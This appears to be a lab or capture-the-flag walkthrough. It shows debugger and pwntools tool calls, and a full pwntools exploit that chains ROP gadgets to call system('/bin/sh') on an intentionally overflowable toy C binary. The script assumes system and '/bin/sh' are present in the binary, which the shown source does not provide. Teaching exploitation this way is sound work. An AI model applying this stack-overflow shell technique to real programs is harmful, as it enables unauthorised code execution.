# ROP Chain — Return-Oriented Programming without a Win Function

A return-oriented programming (ROP) challenge. There is no `win` function — the
binary has NX enabled (non-executable stack), so shellcode won't work. Instead
you must chain gadgets to call `system("/bin/sh")`.

## The Binary

```c
void vuln() {
    char buf[64];
    read(0, buf, 256);  // overflow
}
int main() { vuln(); return 0; }
```

Compiled with: `gcc -g -O0 -fno-stack-protector -no-pie -o rop-chain rop-chain.c`

Note: `-no-pie` avoids ASLR for the binary itself (but libc ASLR is still on in
a real ASLR environment; for this example we assume ASLR is disabled via
`/proc/sys/kernel/randomize_va_space = 0`).

## Walkthrough

### 1. Load and recon

```
edb_load_program(path="/tmp/rop-chain")
edb_list_symbols()
edb_get_protected_memory_regions()
```

Check that the stack is **not** executable (no `X` permission).

### 2. Find overflow offset

```
pwntools_cyclic(length=256)
```

Run, crash, check offset:

```
pwntools_cyclic_find(value="<crashed_value>")
```

Offset is 72 bytes to the return address.

### 3. Identify useful gadgets and addresses

```
edb_list_symbols()
```

Look for `system@plt` and `execve@plt`. If the binary doesn't import them,
you'll need to use a ret2libc approach to resolve them at runtime.

Search for a `"/bin/sh"` string in the binary or libc:

```
edb_search_pattern(pattern="/bin/sh")
```

Find `pop rdi; ret` gadget:

```
edb_disassemble(location="<address>", count=10)
edb_search_pattern(pattern="5f c3")   # opcode for pop rdi; ret
```

### 4. Check memory permissions for gadgets

```
edb_get_protected_memory_regions()
```

Ensure `.text` is readable/executable (it should be).

### 5. Write the chain

```
pwntools_pack(value=<pop_rdi_addr>, size=8, endian="little")
pwntools_pack(value=<binsh_addr>, size=8, endian="little")
pwntools_pack(value=<system_addr>, size=8, endian="little")
```

### 6. Set breakpoint and verify

```
edb_set_breakpoint(location="vuln")
edb_run()

# Step past the read to see the overflowed stack
edb_get_stack(count=32)
edb_read_memory(address="$rsp", size=48)
```

Your ROP chain should be visible on the stack starting at `$rsp`.

### 7. Continue to trigger the chain

```
edb_continue()
```

If everything chains correctly, you get a shell.

## Exploit Script

```python
from pwn import *

context.arch = "amd64"
elf = ELF("/tmp/rop-chain")
rop = ROP(elf)

pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
ret = rop.find_gadget(["ret"]).address

payload = cyclic(72)
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(next(elf.search(b"/bin/sh")))
payload += p64(elf.plt["system"])

p = process("/tmp/rop-chain")
p.send(payload)
p.interactive()
```

## MCP Tools Used

| Tool | Purpose |
|------|---------|
| `edb_disassemble` | Disassemble functions to find gadgets |
| `edb_search_pattern` | Search for gadget opcodes (`5f c3`) and `"/bin/sh"` string |
| `edb_list_symbols` | Find `system@plt` and other function addresses |
| `edb_get_protected_memory_regions` | Verify NX is enabled (stack not executable) |
| `pwntools_pack` | Pack gadget addresses into the payload |
| `pwntools_cyclic` / `pwntools_cyclic_find` | Determine overflow offset |
| `edb_read_memory` | Verify ROP chain bytes on the stack |
| `edb_write_memory` | Modify chain in-place during debugging |
| `edb_get_stack` | Visualize the overflowed stack layout |
